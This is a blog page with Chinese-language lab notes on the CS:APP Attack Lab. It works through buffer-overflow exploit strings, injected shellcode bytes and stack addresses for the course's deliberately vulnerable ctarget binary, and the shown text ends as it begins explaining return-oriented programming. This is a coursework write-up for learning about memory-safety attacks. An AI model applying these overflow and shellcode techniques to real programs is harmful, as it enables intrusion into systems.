<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 4.2.1">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"chuanleiguo.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"hide","padding":18,"offset":12,"onmobile":true},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta name="description" content="正因为未知，人与人之间的羁绊才愈发迷人">
<meta property="og:type" content="website">
<meta property="og:title" content="Chuan&#39;s Cabin">
<meta property="og:url" content="http://chuanleiguo.com/page/2/index.html">
<meta property="og:site_name" content="Chuan&#39;s Cabin">
<meta property="og:description" content="正因为未知，人与人之间的羁绊才愈发迷人">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="Chuanlei Guo">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://chuanleiguo.com/page/2/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-CN'
  };
</script>

  <title>Chuan's Cabin</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

<style>mjx-container[jax="SVG"] {
  direction: ltr;
}

mjx-container[jax="SVG"] > svg {
  overflow: visible;
}

mjx-container[jax="SVG"] > svg a {
  fill: blue;
  stroke: blue;
}

mjx-container[jax="SVG"][display="true"] {
  display: block;
  text-align: center;
  margin: 1em 0;
}

mjx-container[jax="SVG"][justify="left"] {
  text-align: left;
}

mjx-container[jax="SVG"][justify="right"] {
  text-align: right;
}

g[data-mml-node="merror"] > g {
  fill: red;
  stroke: red;
}

g[data-mml-node="merror"] > rect[data-background] {
  fill: yellow;
  stroke: none;
}

g[data-mml-node="mtable"] > line[data-line] {
  stroke-width: 70px;
  fill: none;
}

g[data-mml-node="mtable"] > rect[data-frame] {
  stroke-width: 70px;
  fill: none;
}

g[data-mml-node="mtable"] > .mjx-dashed {
  stroke-dasharray: 140;
}

g[data-mml-node="mtable"] > .mjx-dotted {
  stroke-linecap: round;
  stroke-dasharray: 0,140;
}

g[data-mml-node="mtable"] > svg {
  overflow: visible;
}

[jax="SVG"] mjx-tool {
  display: inline-block;
  position: relative;
  width: 0;
  height: 0;
}

[jax="SVG"] mjx-tool > mjx-tip {
  position: absolute;
  top: 0;
  left: 0;
}

mjx-tool > mjx-tip {
  display: inline-block;
  padding: .2em;
  border: 1px solid #888;
  font-size: 70%;
  background-color: #F8F8F8;
  color: black;
  box-shadow: 2px 2px 5px #AAAAAA;
}

g[data-mml-node="maction"][data-toggle] {
  cursor: pointer;
}

mjx-status {
  display: block;
  position: fixed;
  left: 1em;
  bottom: 1em;
  min-width: 25%;
  padding: .2em .4em;
  border: 1px solid #888;
  font-size: 90%;
  background-color: #F8F8F8;
  color: black;
}

foreignObject[data-mjx-xml] {
  font-family: initial;
  line-height: normal;
  overflow: visible;
}

.MathJax path {
  stroke-width: 3;
}

mjx-container {
  overflow: auto hidden;
}

mjx-container + br {
  display: none;
}
</style></head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Chuan's Cabin</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">Code & Live with Love</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-programming-language">

    <a href="/categories/programming-language" rel="section"><i class="fa fa-rocket fa-fw"></i>编程语言</a>

  </li>
        <li class="menu-item menu-item-sourcecode">

    <a href="/categories/sourcecode" rel="section"><i class="fa fa-code fa-fw"></i>源码分析</a>

  </li>
        <li class="menu-item menu-item-computer-science">

    <a href="/categories/computer-science" rel="section"><i class="fa fa-cogs fa-fw"></i>计算机科学</a>

  </li>
        <li class="menu-item menu-item-mooc">

    <a href="/categories/mooc" rel="section"><i class="fa fa-graduation-cap fa-fw"></i>MOOC</a>

  </li>
        <li class="menu-item menu-item-booknotes">

    <a href="/categories/booknotes" rel="section"><i class="fa fa-book fa-fw"></i>读书笔记</a>

  </li>
        <li class="menu-item menu-item-diary">

    <a href="/categories/diary" rel="section"><i class="fa fa-keyboard fa-fw"></i>日志</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://chuanleiguo.com/2017/07/09/csapp-attacklab/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Chuanlei Guo">
      <meta itemprop="description" content="正因为未知，人与人之间的羁绊才愈发迷人">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Chuan's Cabin">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2017/07/09/csapp-attacklab/" class="post-title-link" itemprop="url">【深入理解计算机系统实验笔记】| Attack Lab</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2017-07-09 21:20:23" itemprop="dateCreated datePublished" datetime="2017-07-09T21:20:23+08:00">2017-07-09</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2020-06-28 17:41:58" itemprop="dateModified" datetime="2020-06-28T17:41:58+08:00">2020-06-28</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/computer-science/" itemprop="url" rel="index"><span itemprop="name">计算机科学</span></a>
                </span>
            </span>

          
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Disqus：</span>
    
    <a title="disqus" href="/2017/07/09/csapp-attacklab/#disqus_thread" itemprop="discussionUrl">
      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2017/07/09/csapp-attacklab/" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>Attack Lab 的主要目的是利用程序中的缓冲区溢出漏洞来实现对系统的攻击。那么如何利用缓冲区漏洞呢？</p>
<h2 id="第一阶段"><a href="#第一阶段" class="headerlink" title="第一阶段"></a>第一阶段</h2><p>第一个关卡不要求向程序中注入代码，而是需要输入一个「引爆字符串」来改变程序的运行轨迹，重定向运行另外一个函数。在 <code>ctarget</code> 中，<code>getbuf</code> 被函数 <code>test</code> 调用：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> val;</span><br><span class="line">  val = getbuf();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"No exploit.  Getbuf returned 0x%x\n"</span>, val);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们希望 <code>getbuf()</code> 在返回后，调用函数 <code>touch1</code> 而不是输出 val 的值。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch1</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  vlevel = <span class="number">1</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Touch1!: You called touch1()\n"</span>);</span><br><span class="line">  validate(<span class="number">1</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们具体要做的事情就是把 <code>touch1</code> 的开始地址放到 <code>getbuf</code> 的 <code>ret</code> 指令中，而且需要注意应该使用小端字节序。</p>
<p>首先，我们反汇编 <code>ctarget</code>：<code>objdump -d ctarget &gt; touch1.s</code><br><img src="/images/2017-7-9/Screen%20Shot%202017-05-14%20at%2020.32.42.png" alt="Screen Shot 2017-05-14 at 20.32.42"></p>
<p>在 touch1.s 中找到 <code>getbuf</code>：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">00000000004017a8 &lt;getbuf&gt;:</span><br><span class="line">  4017a8:	48 83 ec 28          	sub    $0x28,%rsp</span><br><span class="line">  4017ac:	48 89 e7             	mov    %rsp,%rdi</span><br><span class="line">  4017af:	e8 8c 02 00 00       	callq  401a40 &lt;Gets&gt;</span><br><span class="line">  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax</span><br><span class="line">  4017b9:	48 83 c4 28          	add    $0x28,%rsp</span><br><span class="line">  4017bd:	c3                   	retq   </span><br><span class="line">  4017be:	90                   	nop</span><br><span class="line">  4017bf:	90                   	nop</span><br></pre></td></tr></table></figure>

<p>我们可以看到，<code>getbuf</code> 将 <code>%rsp</code> 移动了 <code>0x28</code> 也就是 40 字节。这也就意味着，在往上 4 个字节，就是返回到 <code>test</code> 的返回地址。所以，我们就可以利用缓冲区溢出将返回地址修改掉。</p>
<p>现在我们看看 <code>touch1</code> 在哪里：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">00000000004017c0 &lt;touch1&gt;:</span><br><span class="line">  4017c0:	48 83 ec 08          	sub    $0x8,%rsp</span><br><span class="line">  4017c4:	c7 05 0e 2d 20 00 01 	movl   $0x1,0x202d0e(%rip)        # 6044dc &lt;vlevel&gt;</span><br><span class="line">  4017cb:	00 00 00 </span><br><span class="line">  4017ce:	bf c5 30 40 00       	mov    $0x4030c5,%edi</span><br><span class="line">  4017d3:	e8 e8 f4 ff ff       	callq  400cc0 &lt;puts@plt&gt;</span><br><span class="line">  4017d8:	bf 01 00 00 00       	mov    $0x1,%edi</span><br><span class="line">  4017dd:	e8 ab 04 00 00       	callq  401c8d &lt;validate&gt;</span><br><span class="line">  4017e2:	bf 00 00 00 00       	mov    $0x0,%edi</span><br><span class="line">  4017e7:	e8 54 f6 ff ff       	callq  400e40 &lt;exit@plt&gt;</span><br></pre></td></tr></table></figure>

<p>可以看到 <code>touch1</code> 的开始地址在 <code>0x004017c0</code>，所以我们输入的字符串可以是</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00</span><br><span class="line">c0 17 40 00</span><br></pre></td></tr></table></figure>

<p>然后，我们将这个字符文件转换为字节码 <code>./hex2raw &lt; touch1.txt &gt; touch1_r.txt</code>，然后执行 <code>./ctarget -q -i touch1_r.txt</code>:</p>
<p><img src="/images/2017-7-9/Screen%20Shot%202017-05-14%20at%2020.58.30.png" alt="Screen Shot 2017-05-14 at 20.58.30"></p>
<p>通过第一关，我们就学习了通过使用缓冲区溢出来调用另外的函数。</p>
<h2 id="第二阶段"><a href="#第二阶段" class="headerlink" title="第二阶段"></a>第二阶段</h2><p>第二阶段要求向程序中注入一小段代码，<code>ctarget</code> 中的 <code>touch2</code> 的 C 语言代码为：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch2</span><span class="params">(<span class="keyword">unsigned</span> val)</span> </span>&#123;</span><br><span class="line">  vlevel = <span class="number">2</span>;    <span class="comment">/* Part of validation protocol */</span></span><br><span class="line">  <span class="keyword">if</span> (val == cookie) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Touch2!: You called touch2(0x%.8x)\n"</span>, val);</span><br><span class="line">    validate(<span class="number">2</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Misfire: You called touch2(0x%.8x)\n"</span>, val);</span><br><span class="line">    fail(<span class="number">2</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们需要把自己的 cookie 作为参数传入，因为只有一个参数，所以参数应该被放入寄存器 <code>%rdi</code>，并使用<code>ret</code> 跳转。</p>
<p>我们写好需要注入的汇编代码，首先将 cookie 的值保存到寄存器 <code>%rdi</code>，然后将 <code>touch2</code> 的地址压入栈中，最后返回：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov $0x59b997fa,%rdi</span><br><span class="line">pushq $0x4017ec</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>

<p>接下来，我们将汇编代码转换为机器码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -c touch2.s</span><br><span class="line">objdump -d touch2.o &gt; touch2.bytes</span><br></pre></td></tr></table></figure>

<p>touch2.bytes 中的内容为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">touch2.o:     file format elf64-x86-64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">0000000000000000 &lt;.text&gt;:</span><br><span class="line">   0:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi</span><br><span class="line">   7:	68 ec 17 40 00       	pushq  $0x4017ec</span><br><span class="line">   c:	c3                   	retq</span><br></pre></td></tr></table></figure>

<p>为了执行这段代码，我们需要使用阶段 1 中的方法，跳转到缓冲区的开始位置，去执行我们注入的代码。为了知道缓冲区的起始位置，我们使用 GDB 来调试程序，查看 <code>%rsp</code> 的值。我们在 0x4017b4 处设置断点：</p>
<p><img src="/images/2017-7-9/Screen%20Shot%202017-05-15%20at%2020.34.41.png" alt="Screen Shot 2017-05-15 at 20.34.41"></p>
<p>然后查看寄存器信息：</p>
<p><img src="/images/2017-7-9/Screen%20Shot%202017-05-15%20at%2020.35.08.png" alt="Screen Shot 2017-05-15 at 20.35.08"></p>
<p>可以看到缓冲区的起始位置为 0x5561dc78。</p>
<p>接下来我们就构造需要的字符串：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 fa </span><br><span class="line">97 b9 59 68 </span><br><span class="line">ec 17 40 00 </span><br><span class="line">c3 00 00 00 </span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00 </span><br><span class="line">78 dc 61 55</span><br></pre></td></tr></table></figure>

<p>然后，我们使用 <code>./hex2raw &lt; touch2.txt &gt; touch2_r.txt</code> 生成字节码，然后执行命令 <code>./ctarget -i touch2_r.txt -q</code>，就可以看到执行结果：</p>
<p><img src="/images/2017-7-9/Screen%20Shot%202017-05-15%20at%2020.52.44.png" alt="Screen Shot 2017-05-15 at 20.52.44"></p>
<h2 id="第三阶段"><a href="#第三阶段" class="headerlink" title="第三阶段"></a>第三阶段</h2><p>第三阶段同样要实现代码注入攻击，但是要传入一个额外的字符串。</p>
<p>在 <code>ctarget</code> 中 <code>hexmatch</code> 和 <code>touch3</code> 的 C 语言代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* compare string to hex represention of unsigned value */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">hexmatch</span><span class="params">(<span class="keyword">unsigned</span> val, <span class="keyword">char</span> *sval)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> cbuf[<span class="number">110</span>];</span><br><span class="line">  <span class="comment">/* make position of check string unpredictable */</span></span><br><span class="line">  <span class="keyword">char</span> *s = cbuf + <span class="built_in">random</span>() % <span class="number">100</span>;</span><br><span class="line">  <span class="built_in">sprintf</span>(s, <span class="string">"%.8x"</span>, val);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">strncmp</span>(sval, s, <span class="number">9</span>) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch3</span><span class="params">(<span class="keyword">char</span> *sval)</span> </span>&#123;</span><br><span class="line">  vlevel = <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">if</span> (hexmatch(cookie, sval)) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Touch3!: You called You called touch3(\"%s\")\n"</span>, sval)</span><br><span class="line">    validate(<span class="number">3</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Misfire: You called touch3(\"%s\")\n"</span>, sval);</span><br><span class="line">    fail(<span class="number">3</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们需要在引爆字符串中包含自己 cookie 的字符串表示，这个字符串应该是 8 个 16 进制数字，并以 0 为结尾。这个字符串的地址应该被保存在 <code>%rdi</code> 中。当函数 <code>hexmatch</code> 和 <code>strncmp</code> 被调用的时候，他们会把参数保存到栈上，这会覆盖 <code>getbuf</code> 写入的部分内容。所以，我们需要小心引爆字符串的存放位置。</p>
<p>首先将我的 cookie 转换为 字符串形式：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x59b997fa -&gt; 35 39 62 39 39 37 66 61 00</span><br></pre></td></tr></table></figure>

<p>为了测试 <code>hexmatch</code> 的行为，我们对上一节的字节码稍作修改，将我的 cookie 的字符串表示存储在缓冲区内，并使程序跳转到 <code>touch3</code>，构造字节码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 b8 </span><br><span class="line">dc 61 55 68 </span><br><span class="line">fa 18 40 00 </span><br><span class="line">c3 00 00 00 </span><br><span class="line">35 39 62 39 </span><br><span class="line">39 37 66 61 </span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00 </span><br><span class="line">78 dc 61 55</span><br></pre></td></tr></table></figure>

<p>跳转到 <code>touch3</code> 后，我们可以找到调用 <code>hexmatch</code> 的位置，于是可以分别在前后两行设置断点，并观察缓冲区的变化：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">00000000004018fa &lt;touch3&gt;:</span><br><span class="line">  4018fa:	53                   	push   %rbx</span><br><span class="line">  4018fb:	48 89 fb             	mov    %rdi,%rbx</span><br><span class="line">  4018fe:	c7 05 d4 2b 20 00 03 	movl   $0x3,0x202bd4(%rip)        # 6044dc &lt;vlevel&gt;</span><br><span class="line">  401905:	00 00 00 </span><br><span class="line">  401908:	48 89 fe             	mov    %rdi,%rsi</span><br><span class="line">  40190b:	8b 3d d3 2b 20 00    	mov    0x202bd3(%rip),%edi        # 6044e4 &lt;cookie&gt;</span><br><span class="line">  401911:	e8 36 ff ff ff       	callq  40184c &lt;hexmatch&gt;</span><br><span class="line">  401916:	85 c0                	test   %eax,%eax</span><br></pre></td></tr></table></figure>

<p>在调用 <code>hexmatch</code> 之前，我们可以看到缓冲区的信息如下：</p>
<p><img src="/images/2017-7-9/Screen%20Shot%202017-05-21%20at%2016.02.55.png" alt="Screen Shot 2017-05-21 at 16.02.55"></p>
<p>在调用 <code>hexmatch</code> 之后，我们可以看到缓冲区信息为：<br><img src="/images/2017-7-9/Screen%20Shot%202017-05-21%20at%2016.03.06.png" alt="Screen Shot 2017-05-21 at 16.03.06"></p>
<p>可以看到，缓冲区前三行的内容全部为打乱了，我们保存的字符串信息也被完全破坏了。所以，我们需要为字符串寻找一个新的存放位置。</p>
<p>看到最后一行，<code>0x5561dcb8</code> 之后的位置没有被使用，而且刚好可以存放我们的字符串，所以，抱着试一试的态度，我将字符串目标地址设置为 <code>0x5561dcb8</code>，并将 cookie 的字符串信息保存到相应位置。</p>
<p>汇编代码为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov $0x5561dcb8,%rdi</span><br><span class="line">pushq $0x4018fa</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>

<p>构造字符串为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 b8 </span><br><span class="line">dc 61 55 68 </span><br><span class="line">fa 18 40 00 </span><br><span class="line">c3 00 00 00 </span><br><span class="line">35 39 62 39 </span><br><span class="line">39 37 66 61 </span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00 </span><br><span class="line">78 dc 61 55</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">35 39 62 39</span><br><span class="line">39 37 66 61</span><br><span class="line">00 00 00 00</span><br></pre></td></tr></table></figure>

<p>运行程序：</p>
<p><img src="/images/2017-7-9/Screen%20Shot%202017-05-21%20at%2016.19.59.png" alt="Screen Shot 2017-05-21 at 16.19.59"></p>
<p>成功！</p>
<h2 id="第四阶段"><a href="#第四阶段" class="headerlink" title="第四阶段"></a>第四阶段</h2><p>从第四阶段开始，我们要对 <code>rtarget</code> 进行缓冲区攻击。但是攻击 <code>rtarget</code> 要更加困难，因为它采用了两种方法来防止缓冲区攻击：</p>
<ol>
<li>栈的内容是随机的，每次运行时，栈中内容的地址都不一样。所以我们无法决定应该跳转的地址。</li>
<li>栈中代码是不可以执行的，所以即使我们可以跳转到注入代码，程序也会遇到段错误。</li>
</ol>
<p>幸运的是，我们可以通过执行已有的代码来达到我们的目的，而不是注入新的代码，这种方法被称为 <code>return-oriented-programming</code>（ROP）。ROP 的策略是在程序中找到指定的字节序列，这些字节序列包含某些指令并以<code>ret</code>结尾。这样的一个字节序列被称为一个 <em>gadget</em>。</p>
<p><img src="/images/2017-7-9/Screen%20Shot%202017-07-09%20at%2020.09.59.png" alt="Screen Shot 2017-07-09 at 20.09.59"><br>由上图可以看出，栈可以用来设置跳转到 n 个 <em>gadget*，并执行其中的代码。使用这种方式，利用 <code>ret</code> 指令，我们可以运行一连串的 *gadget</em> 并执行其中的代码。</p>
<p>例如下面的代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setval_210</span><span class="params">(<span class="keyword">unsigned</span> *p)</span> </span>&#123;</span><br><span class="line">    *p = <span class="number">3347663060U</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>它对应的汇编代码为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0000000000400f15 &lt;setval_210&gt;:</span><br><span class="line">  400f15:       c7 07 d4 48 89 c7       movl   $0xc78948d4,(%rdi)</span><br><span class="line">  400f1b:       c3                      retq</span><br></pre></td></tr></table></figure>

